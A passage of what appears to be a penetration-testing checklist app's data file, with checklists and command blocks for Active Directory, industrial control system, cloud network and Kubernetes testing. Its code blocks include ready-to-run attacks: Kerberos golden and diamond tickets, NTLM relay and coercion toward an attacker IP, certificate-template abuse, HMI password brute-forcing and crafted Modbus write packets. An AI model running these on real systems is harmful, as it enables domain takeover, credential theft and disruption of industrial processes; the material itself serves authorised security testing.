kerberos::golden /domain:domain.local /sid:S-1-5-21-... /krbtgt:krbtgt_hash /user:Administrator /ptt

# Unconstrained delegation attack checking
Get-ADComputer -Filter {TrustedForDelegation -eq $True}
# Using PowerView
Get-DomainComputer -Unconstrained

# Diamond Ticket attack
# First get TGT using standard methods
# Then modify TGT properties with Rubeus
Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show

# Kerberos Bronze Bit attack
# Using the CVE-2020-17049 scanner
python3 CVE-2020-17049-scanner.py -domain domain.local -dc-ip 10.0.0.10 -users-file users.txt

# RBCD (resource-based constrained delegation) attack
# Using PowerView to add computer object
New-MachineAccount -MachineAccount attacker-pc -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force)
# Then set RBCD using PowerView
$ComputerSid = Get-DomainComputer attacker-pc -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer TargetServer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}</pre>
            </div>
            
            <div class="technique-item">
                <h4 class="technique-title">NTLM Relay and Coercion Attacks</h4>
                <p class="technique-description">Capturing and relaying NTLM authentication to gain unauthorized access.</p>
                <pre class="code-block">
# NTLM Relay with Impacket's ntlmrelayx.py
# Set up RESPONDER to force NTLM authentication
Responder -I eth0 -rv

# In another terminal, set up ntlmrelayx to relay captured credentials
ntlmrelayx.py -tf targets.txt -smb2support

# Targeting specific service with ntlmrelayx
ntlmrelayx.py -t ldaps://dc.domain.local -smb2support --escalate-user user

# Targeting ADCS for relay and certificate theft
ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# SMB relay attack mitigation checking
# Check if SMB signing is enforced
nmap --script smb2-security-mode -p 445 10.0.0.0/24

# PetitPotam NTLM coercion
python3 PetitPotam.py -d domain.local -u username -p password attacker_ip target_dc_ip

# PrinterBug/SpoolSample NTLM coercion
python3 SpoolSample.py domain.local/username:password@target_dc_ip attacker_ip

# DFSCoerce NTLM coercion
python3 dfscoerce.py -d domain.local -u username -p password target_dc_ip attacker_ip</pre>
            </div>
            
            <div class="technique-item">
                <h4 class="technique-title">Advanced Active Directory Enumeration</h4>
                <p class="technique-description">Discovering security-critical information from Active Directory.</p>
                <ul>
                    <li><strong>Bloodhound AD Analysis:</strong> Graph-based mapping of domain relationships and attack paths</li>
                    <li><strong>LDAP Queries:</strong> Using LDAP search to find sensitive domain information</li>
                    <li><strong>Group Policy Analysis:</strong> Finding security weaknesses in GPOs</li>
                    <li><strong>Trust Mapping:</strong> Identifying transitive trusts and external connections</li>
                    <li><strong>Privileged Accounts:</strong> Finding and analyzing privileged access</li>
                    <li><strong>ACL Analysis:</strong> Discovering dangerous permissions in AD objects</li>
                </ul>
                <pre class="code-block">
# Bloodhound collection
.\SharpHound.exe -c All
# Or using the Python collector
bloodhound-python -u user -p password -d domain.local -ns dc_ip -c All

# PowerView enumeration examples
# Find users with SPNs
Get-DomainUser -SPN

# Find users that don't require Kerberos pre-authentication
Get-DomainUser -PreauthNotRequired

# Map domain trusts
Get-DomainTrust -Domain domain.local

# Find computers where Domain Admins are logged in
Find-DomainUserLocation -CheckAccess

# Enumerate GPOs with interesting settings
Get-DomainGPO | Get-DomainObjectAcl | ?{$_.ActiveDirectoryRights -match "WriteProperty|GenericAll" -and $_.SecurityIdentifier -match "S-1-5-21-.*-513"}

# ADExplorer for offline analysis
# Extract Active Directory database for offline analysis
# Use ADExplorer.exe from Sysinternals

# AD CS enumeration - find vulnerable templates
certipy find -u user@domain.local -p password -dc-ip 10.0.0.10 -vulnerable

# Check for ADIDNS record poisoning opportunities
Get-DomainDNSRecord -ZoneName domain.local | Where-Object {$_.Timestamp -lt (Get-Date).AddDays(-30)}</pre>
            </div>
            
            <div class="technique-item">
                <h4 class="technique-title">Active Directory Certificate Services (AD CS) Attacks</h4>
                <p class="technique-description">Methods to exploit vulnerabilities in PKI implementations.</p>
                <pre class="code-block">
# Enumerate certificate templates
certipy find -u user@domain.local -p password -dc-ip 10.0.0.10

# ESC1 - User certificates that allow client authentication with enrollee-supplied SAN
certipy req -u user@domain.local -p password -target ca.domain.local -ca 'CA-NAME' -template 'VulnTemplate' -altname 'administrator@domain.local'

# ESC2 - Vulnerable certificate template with enrollment rights for low privileged users
certipy req -u user@domain.local -p password -target ca.domain.local -ca 'CA-NAME' -template 'VulnTemplate2'

# ESC3 - Template with enrollment rights to Authenticated Users
certipy find -u user@domain.local -p password -dc-ip 10.0.0.10 -vulnerable -stdout | grep -A 10 ESC3

# ESC8 - NTLM relay to Certificate Authority Web Enrollment 
# Start ntlmrelayx to target the CA Web Enrollment
ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp --adcs --template DomainController
# Coerce authentication from a machine account
python3 PetitPotam.py -d domain.local -u user -p password 192.168.1.100 dc.domain.local

# Using compromised certificate for authentication
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.10

# Persistence via Shadow Credentials
certipy shadow auto -u user@domain.local -p password -account target_account</pre>
            </div>
        </div>
        `,
        toolsHTML: `
        <div class="tools-grid">
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-project-diagram tool-icon"></i>
                    <h4 class="tool-title">BloodHound</h4>
                </div>
                <p class="tool-description">Graph theory-based tool for Active Directory security analysis and attack path visualization.</p>
                <a href="https://github.com/BloodHoundAD/BloodHound" target="_blank" class="tool-link">
                    <span>GitHub</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
            
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-eye tool-icon"></i>
                    <h4 class="tool-title">PowerView</h4>
                </div>
                <p class="tool-description">PowerShell tool for detailed Active Directory enumeration and analysis.</p>
                <a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon" target="_blank" class="tool-link">
                    <span>GitHub</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
            
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-exchange-alt tool-icon"></i>
                    <h4 class="tool-title">Impacket</h4>
                </div>
                <p class="tool-description">Collection of Python scripts for working with network protocols, including multiple Active Directory attack tools.</p>
                <a href="https://github.com/SecureAuthCorp/impacket" target="_blank" class="tool-link">
                    <span>GitHub</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
            
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-broadcast-tower tool-icon"></i>
                    <h4 class="tool-title">Responder</h4>
                </div>
                <p class="tool-description">LLMNR, NBT-NS and MDNS poisoner for credential harvesting and relay attacks.</p>
                <a href="https://github.com/lgandx/Responder" target="_blank" class="tool-link">
                    <span>GitHub</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
            
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-ticket-alt tool-icon"></i>
                    <h4 class="tool-title">Rubeus</h4>
                </div>
                <p class="tool-description">Advanced tool for Kerberos interaction and attacks on Windows.</p>
                <a href="https://github.com/GhostPack/Rubeus" target="_blank" class="tool-link">
                    <span>GitHub</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
            
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-certificate tool-icon"></i>
                    <h4 class="tool-title">Certipy</h4>
                </div>
                <p class="tool-description">Tool for Active Directory Certificate Services enumeration and abuse.</p>
                <a href="https://github.com/ly4k/Certipy" target="_blank" class="tool-link">
                    <span>GitHub</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
        </div>
        `
    },
    'industrial-control': {
        title: '9. Industrial Control Systems Testing',
        subtitle: 'Assessing security of SCADA and ICS environments',
        priority: 'critical',
        icon: '<i class="fas fa-industry" style="color: var(--danger);"></i>',
        checklistItems: [
            { groupTitle: '9.1 ICS Network Analysis' },
            { id: '9.1.1', text: 'Identify ICS components and protocols in use' },
            { id: '9.1.2', text: 'Map communications between ICS components' },
            { id: '9.1.3', text: 'Assess ICS network segmentation' },
            { id: '9.1.4', text: 'Test access controls between IT and OT networks' },
            { id: '9.1.5', text: 'Evaluate network security monitoring for ICS' },
            { id: '9.1.6', text: 'Map ICS zones and conduits according to IEC 62443' },
            
            { groupTitle: '9.2 Protocol Testing' },
            { id: '9.2.1', text: 'Test security of Modbus communications' },
            { id: '9.2.2', text: 'Evaluate DNP3 implementation security' },
            { id: '9.2.3', text: 'Assess EtherNet/IP security' },
            { id: '9.2.4', text: 'Test Profinet/Profibus security' },
            { id: '9.2.5', text: 'Evaluate OPC UA/DA security' },
            { id: '9.2.6', text: 'Test BACnet and building automation protocols' },
            
            { groupTitle: '9.3 ICS Component Security' },
            { id: '9.3.1', text: 'Assess security of HMI systems' },
            { id: '9.3.2', text: 'Test PLC/RTU security configurations' },
            { id: '9.3.3', text: 'Evaluate engineering workstation security' },
            { id: '9.3.4', text: 'Assess historian and data server security' },
            { id: '9.3.5', text: 'Test embedded device security in ICS components' },
            { id: '9.3.6', text: 'Evaluate ICS-specific VPN and remote access systems' },
            
            { groupTitle: '9.4 ICS-Specific Vulnerabilities' },
            { id: '9.4.1', text: 'Check for default/hardcoded credentials in ICS devices' },
            { id: '9.4.2', text: 'Test for vulnerable firmware versions' },
            { id: '9.4.3', text: 'Assess proprietary protocol vulnerabilities' },
            { id: '9.4.4', text: 'Evaluate authentication and authorization controls' },
            { id: '9.4.5', text: 'Document ICS findings with special attention to safety impacts' },
            { id: '9.4.6', text: 'Evaluate ICS supply chain risks' }
        ],
        techniquesHTML: `
        <div class="techniques-list">
            <div class="technique-item">
                <h4 class="technique-title">ICS Protocol Analysis</h4>
                <p class="technique-description">Techniques for securely analyzing industrial protocols with minimal risk.</p>
                <pre class="code-block">
# Passive Modbus traffic analysis with sniffing
sudo tcpdump -i eth0 -n port 502 -w modbus_capture.pcap

# Analyzing captured Modbus traffic with Wireshark
wireshark -r modbus_capture.pcap

# Safe Modbus enumeration using modbus-cli
modbus read 10.0.0.2 holding-register 0 10
modbus discover 10.0.0.0/24

# DNP3 enumeration
dnp3-simulator -p dnp-master -i eth0 -a 10.0.0.2

# OPC server enumeration
opcua-client-discover opc.tcp://10.0.0.2:4840

# Passive protocol identification with NetworkMiner
NetworkMiner -r ics_traffic.pcap

# Using Wireshark with ICS protocol dissectors
tshark -r ics_traffic.pcap -Y "modbus || s7comm || dnp3 || ethernetip || cotp || enip"

# BACnet discovery (building automation)
bacnet-discover --interface eth0 --timeout 5</pre>
                <p>Key protocol security aspects to evaluate:</p>
                <ul>
                    <li>Authentication mechanisms (often minimal or absent)</li>
                    <li>Message integrity checks</li>
                    <li>Encryption implementation (frequently cleartext)</li>
                    <li>Function code restrictions and validation</li>
                    <li>Protocol implementation vulnerabilities</li>
                    <li>Protocol version and security features</li>
                    <li>Transition between secure and legacy protocols</li>
                </ul>
            </div>
            
            <div class="technique-item">
                <h4 class="technique-title">ICS Network Segmentation Testing</h4>
                <p class="technique-description">Methods to assess separation between IT and OT networks while maintaining safety.</p>
                <ol>
                    <li><strong>Map Network Boundaries:</strong> Identify demarcation points between networks</li>
                    <li><strong>Validate Firewall Rules:</strong> Test filtering between IT/OT segments</li>
                    <li><strong>Data Diode Verification:</strong> Confirm unidirectional communication where implemented</li>
                    <li><strong>Jump Host Analysis:</strong> Evaluate security of intermediate systems</li>
                    <li><strong>Protocol Conversion Analysis:</strong> Check security of protocol gateway devices</li>
                    <li><strong>DMZ Implementation:</strong> Verify effectiveness of industrial DMZ</li>
                </ol>
                <pre class="code-block">
# Test firewall rules at IT/OT boundary (from IT network)
nmap -sS -p 502,20000,44818,102,1911,2222,47808,1962 10.0.0.0/24

# Check for unauthorized routes between networks
traceroute -n 10.0.0.2
hping3 -S -p 502 -c 4 10.0.0.2

# Identify devices with multiple network interfaces (possible bypass points)
arp-scan -l | grep -i siemens
arp-scan -l | grep -i rockwell
arp-scan -l | grep -i schneider

# Test data diode implementations
# Send traffic in the unauthorized direction
echo "TEST" > /dev/tcp/10.0.0.5/502

# Validate jump server controls
# Test direct access bypassing jump servers
for port in 22 80 443 3389 5900; do
  nc -zv protected.ics.device $port
done

# Check for misconfigured cross-domain shares
smbclient -L //jumpserver.ics
mount | grep -i ics</pre>
            </div>
            
            <div class="technique-item">
                <h4 class="technique-title">ICS Component Security Assessment</h4>
                <p class="technique-description">Safely testing the security of industrial control systems components.</p>
                <pre class="code-block">
# PLCScan for identifying and fingerprinting PLCs
python plcscan.py 10.0.0.0/24

# Testing for default credentials on HMI systems
hydra -l Administrator -P default_hmi_passwords.txt 10.0.0.5 http-post-form "/login.php:username=^USER^&password=^PASS^:Failed"

# Testing PLC memory access with Modbus
modbus read 10.0.0.2 coil 0 10

# Safe vulnerability scanning of ICS components
# Using specialized ICS-aware scanner like Tenable OT or Claroty
nessus-cli scan --policy "Safe ICS Scan" --targets 10.0.0.5

# Checking firmware versions against known vulnerabilities
curl -s "https://ics-cert.us-cert.gov/advisories" | grep -i siemens

# Testing OPC UA security settings
opcua-client scan --encryption-none --mode-none opc.tcp://10.0.0.5:4840

# Checking Historian database security
sqlmap -u "http://historian.local/query.asp?id=1" --dbms=mssql --technique=U</pre>
                <p class="technique-note" style="margin-top: 10px; padding: 10px; background-color: #ffebee; border-left: 4px solid #dc3545; color: #b71c1c;">
                    <strong> SAFETY WARNING:</strong> Always conduct ICS testing with extreme caution. Active scanning and testing can disrupt operational processes and potentially create safety hazards. Obtain explicit approval, involve OT personnel, and prefer passive analysis methods.
                </p>
            </div>
            
            <div class="technique-item">
                <h4 class="technique-title">ICS-Specific Defense Bypass Techniques</h4>
                <p class="technique-description">Methods for evaluating the resilience of ICS security controls.</p>
                <pre class="code-block">
# Testing protocol deep packet inspection bypass
# Modifying Modbus function codes in non-standard ways
# Using Scapy to craft custom Modbus packets
from scapy.all import *
from pymodbus.client.sync import ModbusTcpClient
# Custom packet to test non-standard function code handling
packet = (IP(dst="10.0.0.2")/TCP(dport=502)/ModbusADU(transId=1, unitId=1)/
          ModbusPDU_Read_Generic(funcCode=250, startAddr=1000, quantity=1))
send(packet)

# Testing ICS firewall timestamps and sequence filtering
# Send packets with manipulated timestamps or sequence numbers
for i in range(0, 10):
    packet = (IP(dst="10.0.0.2")/TCP(dport=502, seq=100000+i)/
              Raw(load=b"\\x00\\x01\\x00\\x00\\x00\\x06\\x01\\x03\\x00\\x00\\x00\\x01"))
    send(packet)
    time.sleep(2)  # Manipulate timing between packets

# Checking for vulnerable OT VPN implementations
nmap -sV --script "http-vuln-*" -p 443,10000 ics-vpn.local

# Testing ICS protocol gateway filtering
# Normal request followed by malicious payload
client = ModbusTcpClient('10.0.0.2', port=502)
client.read_holding_registers(0, 10, unit=1)
# Then try direct Modbus packet with raw TCP
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.0.0.2", 502))
s.send(b"\\x00\\x01\\x00\\x00\\x00\\x06\\x01\\x10\\x43\\x10\\x00\\x01")</pre>
            </div>
        </div>
        `,
        toolsHTML: `
        <div class="tools-grid">
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-cogs tool-icon"></i>
                    <h4 class="tool-title">PLCScan</h4>
                </div>
                <p class="tool-description">Tool specifically designed for safely identifying and fingerprinting PLCs and other ICS devices.</p>
                <a href="https://github.com/meeas/plcscan" target="_blank" class="tool-link">
                    <span>GitHub</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
            
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-exchange-alt tool-icon"></i>
                    <h4 class="tool-title">Modbus-cli</h4>
                </div>
                <p class="tool-description">Command-line tool for interacting with Modbus devices for testing and analysis.</p>
<a href="https://github.com/favalex/modbus-cli" target="_blank" class="tool-link">
                    <span>GitHub</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
            
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-shield-alt tool-icon"></i>
                    <h4 class="tool-title">ICS-Security-Tools</h4>
                </div>
                <p class="tool-description">Collection of tools and resources for industrial control system security testing.</p>
                <a href="https://github.com/ITI/ICS-Security-Tools" target="_blank" class="tool-link">
                    <span>GitHub</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
            
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-search tool-icon"></i>
                    <h4 class="tool-title">Wireshark ICS Analysis</h4>
                </div>
                <p class="tool-description">Protocol analyzers with ICS-specific dissector plugins for various industrial protocols.</p>
                <a href="https://www.wireshark.org/" target="_blank" class="tool-link">
                    <span>Website</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
            
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-microscope tool-icon"></i>
                    <h4 class="tool-title">Isprotect</h4>
                </div>
                <p class="tool-description">ICS protocol security testing framework focused on protocol implementation vulnerabilities.</p>
                <a href="https://github.com/digitalbond/isprotect" target="_blank" class="tool-link">
                    <span>GitHub</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
            
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-industry tool-icon"></i>
                    <h4 class="tool-title">CyberX-XSense</h4>
                </div>
                <p class="tool-description">ICS security monitoring platform for passive network analysis and anomaly detection.</p>
                <a href="https://www.cyberx-labs.com/" target="_blank" class="tool-link">
                    <span>Website</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
        </div>
        `
    },
    'cloud-network': {
        title: '10. Cloud Network Security',
        subtitle: 'Testing security of cloud-based network infrastructure',
        priority: 'high',
        icon: '<i class="fas fa-cloud" style="color: var(--warning);"></i>',
        checklistItems: [
            { groupTitle: '10.1 Cloud Network Configuration' },
            { id: '10.1.1', text: 'Assess Virtual Private Cloud (VPC) architecture' },
            { id: '10.1.2', text: 'Evaluate network security groups and ACLs' },
            { id: '10.1.3', text: 'Test for insecure network configurations' },
            { id: '10.1.4', text: 'Analyze load balancer security' },
            { id: '10.1.5', text: 'Assess service networking configurations' },
            { id: '10.1.6', text: 'Evaluate private link and endpoint security' },
            
            { groupTitle: '10.2 Cloud-to-On-Premises Connectivity' },
            { id: '10.2.1', text: 'Test VPN/Direct Connect security' },
            { id: '10.2.2', text: 'Evaluate hybrid cloud network controls' },
            { id: '10.2.3', text: 'Assess transit gateway/peering configurations' },
            { id: '10.2.4', text: 'Test for lateral movement between environments' },
            { id: '10.2.5', text: 'Check for secure traffic inspection' },
            { id: '10.2.6', text: 'Evaluate cloud identity federation security' },
            
            { groupTitle: '10.3 Cloud Network Services' },
            { id: '10.3.1', text: 'Evaluate WAF/API Gateway security' },
            { id: '10.3.2', text: 'Test cloud DNS service security' },
            { id: '10.3.3', text: 'Assess CDN security configurations' },
            { id: '10.3.4', text: 'Test serverless function networking' },
            { id: '10.3.5', text: 'Evaluate container service network security' },
            { id: '10.3.6', text: 'Test cloud security services (Azure Security Center, AWS GuardDuty, etc.)' },
            
            { groupTitle: '10.4 Cloud Network Monitoring' },
            { id: '10.4.1', text: 'Assess cloud flow logs configuration' },
            { id: '10.4.2', text: 'Test network traffic analysis capabilities' },
            { id: '10.4.3', text: 'Evaluate network intrusion detection' },
            { id: '10.4.4', text: 'Check network-related alerts and responses' },
            { id: '10.4.5', text: 'Document cloud network security findings and misconfigurations' },
            { id: '10.4.6', text: 'Verify network-level encryption and protection mechanisms' }
        ],
        techniquesHTML: `
        <div class="techniques-list">
            <div class="technique-item">
                <h4 class="technique-title">VPC Security Assessment</h4>
                <p class="technique-description">Comprehensive evaluation of cloud virtual network security.</p>
                <pre class="code-block">
# AWS VPC Security Groups analysis
aws ec2 describe-security-groups --region us-west-2 --output json | jq '.SecurityGroups[] | select(.IpPermissions[].IpRanges[].CidrIp == "0.0.0.0/0")'

# Azure Network Security Group analysis
az network nsg list --output json | jq '.[] | select(.securityRules[].sourceAddressPrefix == "*")'

# Testing routing tables for misconfigurations
aws ec2 describe-route-tables --region us-west-2 --output json | jq '.RouteTables[].Routes[]'

# Finding public subnets in VPC
aws ec2 describe-subnets --region us-west-2 --output json | jq '.Subnets[] | select(.MapPublicIpOnLaunch == true)'

# Checking for VPC flow logs status
aws ec2 describe-flow-logs --region us-west-2

# GCP VPC firewall rule analysis
gcloud compute firewall-rules list --format=json | jq '.[] | select(.sourceRanges | contains(["0.0.0.0/0"]))'

# Testing VPC Network Peering security
aws ec2 describe-vpc-peering-connections --region us-west-2 | jq '.VpcPeeringConnections[]'

# Checking for exposed load balancers
aws elbv2 describe-load-balancers --region us-west-2 | jq '.LoadBalancers[] | select(.Scheme == "internet-facing")'</pre>
            </div>
            
            <div class="technique-item">
                <h4 class="technique-title">Cloud Network Segmentation Testing</h4>
                <p class="technique-description">Methods to evaluate isolation between cloud environments and resources.</p>
                <ul>
                    <li><strong>Subnet Isolation Testing:</strong> Verify traffic controls between subnets</li>
                    <li><strong>VPC Peering Analysis:</strong> Evaluate security of VPC connections</li>
                    <li><strong>Transit Gateway Controls:</strong> Test central routing point security</li>
                    <li><strong>Network ACL Effectiveness:</strong> Verify stateless filtering rules</li>
                    <li><strong>Security Group Analysis:</strong> Assess stateful filtering configurations</li>
                    <li><strong>Service Endpoint Restrictions:</strong> Test private endpoint access controls</li>
                    <li><strong>Cross-Account Network Access:</strong> Identify improper cross-account routes</li>
                </ul>
                <pre class="code-block">
# Testing connectivity between instances in different subnets
# 1. Access instances via SSM or bastion host
# 2. Use network tools from within the environment

# On EC2 instance in subnet A
ping 10.0.2.5  # Instance in subnet B
nc -zv 10.0.2.5 22
traceroute 10.0.2.5

# Testing VPC endpoint controls
aws ec2 describe-vpc-endpoints --region us-west-2 --output json | jq '.'

# Analyzing transitive routing through Transit Gateway
aws ec2 describe-transit-gateway-route-tables --region us-west-2 | jq '.'

# Azure private endpoint security testing
az network private-endpoint-connection list -g ResourceGroup | jq '.'

# Testing GCP serverless VPC access
gcloud compute networks vpc-access connectors describe connector-name --region=us-central1</pre>
            </div>
            
            <div class="technique-item">
                <h4 class="technique-title">Cloud Network Services Security Testing</h4>
                <p class="technique-description">Evaluating the security of network-related cloud services.</p>
                <pre class="code-block">
# Testing AWS API Gateway configurations
aws apigateway get-rest-apis --region us-west-2
aws apigateway get-stages --rest-api-id abcd1234 --region us-west-2

# Checking WAF ACLs and rules
aws wafv2 list-web-acls --scope REGIONAL --region us-west-2
aws wafv2 get-web-acl --scope REGIONAL --region us-west-2 --web-acl-id abcd1234 --name my-web-acl

# Testing Lambda function networking
aws lambda get-function --function-name my-function --region us-west-2 | jq '.Configuration.VpcConfig'

# For Azure, checking Azure Firewall settings
az network firewall show -g MyResourceGroup -n MyFirewall

# Testing DNS security in AWS Route 53
aws route53 list-query-logging-configs
aws route53 list-resource-record-sets --hosted-zone-id Z1234567890XYZ | jq '.ResourceRecordSets[] | select(.Type == "A" or .Type == "AAAA" or .Type == "CNAME")'

# Analyzing Azure Front Door security settings
az network front-door list | jq '.'
az network front-door waf-policy list | jq '.'

# GCP Cloud Armor WAF testing
gcloud compute security-policies list --format=json | jq '.'</pre>
                <p>Key service aspects to evaluate:</p>
                <ul>
                    <li>Public vs. private service endpoints</li>
                    <li>Authentication and authorization for network services</li>
                    <li>TLS configurations and certificate management</li>
                    <li>DDoS protection settings</li>
                    <li>Network path analysis for data exfiltration risks</li>
                    <li>Service-to-service network controls</li>
                    <li>Cloud provider backbone security mechanisms</li>
                </ul>
            </div>
            
            <div class="technique-item">
                <h4 class="technique-title">Cloud Network Identity and Access Testing</h4>
                <p class="technique-description">Methods for evaluating IAM controls for cloud networking.</p>
                <pre class="code-block">
# Analyzing AWS network-related permissions
aws iam list-policies --scope AWS | jq '.Policies[] | select(.PolicyName | contains("VPC") or contains("Network") or contains("EC2"))'

# Finding IAM policies that allow VPC changes
aws iam list-policies --scope All | jq '.Policies[].Arn' | xargs -I{} aws iam get-policy-version --policy-arn {} --version-id v1 | jq '.PolicyVersion.Document.Statement[] | select(.Action | if type == "string" then . == "ec2:*" or . == "ec2:CreateVpc" else any(. == "ec2:*" or . == "ec2:CreateVpc") end)'

# Testing permissions boundaries for network administrators
aws iam list-roles | jq '.Roles[] | select(.RoleName | contains("Network") or contains("Admin"))' | jq '.RoleName' | xargs -I{} aws iam list-attached-role-policies --role-name {}

# Azure network role assignment analysis
az role assignment list --include-inherited --include-groups | jq '.[] | select(.roleDefinitionName | contains("Network"))'

# GCP network IAM testing
gcloud projects get-iam-policy [PROJECT_ID] --format=json | jq '.bindings[] | select(.role | contains("compute.network"))'</pre>
            </div>
        </div>
        `,
        toolsHTML: `
        <div class="tools-grid">
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-cloud-download-alt tool-icon"></i>
                    <h4 class="tool-title">CloudMapper</h4>
                </div>
                <p class="tool-description">Tool for analyzing AWS environments, creating network diagrams, and identifying security issues.</p>
                <a href="https://github.com/duo-labs/cloudmapper" target="_blank" class="tool-link">
                    <span>GitHub</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
            
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-sitemap tool-icon"></i>
                    <h4 class="tool-title">ScoutSuite</h4>
                </div>
                <p class="tool-description">Multi-cloud security auditing tool that provides detailed reports on cloud network configurations.</p>
                <a href="https://github.com/nccgroup/ScoutSuite" target="_blank" class="tool-link">
                    <span>GitHub</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
            
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-shield-alt tool-icon"></i>
                    <h4 class="tool-title">Prowler</h4>
                </div>
                <p class="tool-description">Command-line tool for AWS security assessment, including network security checks.</p>
                <a href="https://github.com/toniblyx/prowler" target="_blank" class="tool-link">
                    <span>GitHub</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
            
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-cloud-rain tool-icon"></i>
                    <h4 class="tool-title">CloudSploit</h4>
                </div>
                <p class="tool-description">Security configuration monitoring for AWS, Azure, GCP, and Oracle Cloud, including network security checks.</p>
                <a href="https://github.com/aquasecurity/cloudsploit" target="_blank" class="tool-link">
                    <span>GitHub</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
            
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-cloud-upload-alt tool-icon"></i>
                    <h4 class="tool-title">Steampipe</h4>
                </div>
                <p class="tool-description">SQL-powered tool for querying and analyzing cloud infrastructure, including network configurations.</p>
                <a href="https://github.com/turbot/steampipe" target="_blank" class="tool-link">
                    <span>GitHub</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
            
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-diagnoses tool-icon"></i>
                    <h4 class="tool-title">CloudQuery</h4>
                </div>
                <p class="tool-description">Open-source cloud asset inventory with SQL interface for security assessments across providers.</p>
                <a href="https://github.com/cloudquery/cloudquery" target="_blank" class="tool-link">
                    <span>GitHub</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
        </div>
        `
    },
    'container-networks': {
        title: '11. Container & Virtualization Networks',
        subtitle: 'Testing security of container orchestration and virtualized networks',
        priority: 'high',
        icon: '<i class="fas fa-cubes" style="color: var(--warning);"></i>',
        checklistItems: [
            { groupTitle: '11.1 Container Network Security' },
            { id: '11.1.1', text: 'Assess container network architecture' },
            { id: '11.1.2', text: 'Evaluate container network policies' },
            { id: '11.1.3', text: 'Test container-to-container communications' },
            { id: '11.1.4', text: 'Analyze container network interfaces' },
            { id: '11.1.5', text: 'Assess container orchestration network security' },
            { id: '11.1.6', text: 'Evaluate container registry and image security' },
            
            { groupTitle: '11.2 Kubernetes Network Security' },
            { id: '11.2.1', text: 'Evaluate Kubernetes network policies' },
            { id: '11.2.2', text: 'Test pod-to-pod communication restrictions' },
            { id: '11.2.3', text: 'Assess network plugin security (Calico, Flannel, etc.)' },
            { id: '11.2.4', text: 'Test service mesh implementations (Istio, Linkerd)' },
            { id: '11.2.5', text: 'Evaluate ingress/egress controller security' },
            { id: '11.2.6', text: 'Assess Kubernetes API server network security' },
            
            { groupTitle: '11.3 Virtual Network Security' },
            { id: '11.3.1', text: 'Test hypervisor network isolation' },
            { id: '11.3.2', text: 'Assess vSwitch and vRouter security' },
            { id: '11.3.3', text: 'Evaluate VM network interface security' },
            { id: '11.3.4', text: 'Test network function virtualization security' },
            { id: '11.3.5', text: 'Check for virtualization escape vulnerabilities' },
            { id: '11.3.6', text: 'Evaluate nested virtualization security' },
            
            { groupTitle: '11.4 Orchestration Network Controls' },
            { id: '11.4.1', text: 'Test overlay network security' },
            { id: '11.4.2', text: 'Evaluate container registry security' },
            { id: '11.4.3', text: 'Assess multi-cluster networking security' },
            { id: '11.4.4', text: 'Test for container breakout to host network' },
            { id: '11.4.5', text: 'Document container and virtualization network vulnerabilities' },
            { id: '11.4.6', text: 'Evaluate cloud provider integration security' }
        ],
        techniquesHTML: `
        <div class="techniques-list">
            <div class="technique-item">
                <h4 class="technique-title">Kubernetes Network Security Assessment</h4>
                <p class="technique-description">Techniques for evaluating Kubernetes cluster network security.</p>
                <pre class="code-block">
# Examining Kubernetes network policies
kubectl get networkpolicies --all-namespaces
kubectl describe networkpolicy -n app-namespace

# Testing pod-to-pod communications (from inside a pod)
kubectl exec -it test-pod -- sh
# From inside the pod
curl -v http://other-service:8080

# Analyzing cluster network configuration
kubectl get nodes -o wide
